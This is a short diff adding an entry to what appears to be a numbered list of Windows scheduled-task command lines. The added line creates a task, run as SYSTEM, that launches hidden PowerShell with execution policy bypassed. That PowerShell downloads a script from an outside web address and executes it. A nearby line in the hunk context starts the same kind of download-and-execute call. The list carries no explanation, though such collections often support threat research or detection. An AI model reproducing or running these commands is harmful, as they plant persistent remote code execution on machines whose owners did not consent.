@@ -13,3 +13,5 @@ C:\Windows\System32\schtasks.exe /Create /TN "Last Task" /TR "iex(New-Object Net
 #5
 C:\Windows\System32\schtasks.exe /Create /TN "Last Task" /TR "%ComSpec% /c \"C:\Windows\System32\calc.exe\"" /SC ONCE /ST 23:59 /SD 21/12/2016
 
+#6
+C:\Windows\System32\schtasks.exe /Create /TN "Last Task" /TR "powershell -w hidden -nop -ep bypass -c iex(New-Object Net.WebClient).DownloadString('http://www.geographycollector.com/shared/ps.dat')" /SC ONCE /ST 23:59 /SD 16/10/2015 /ru System
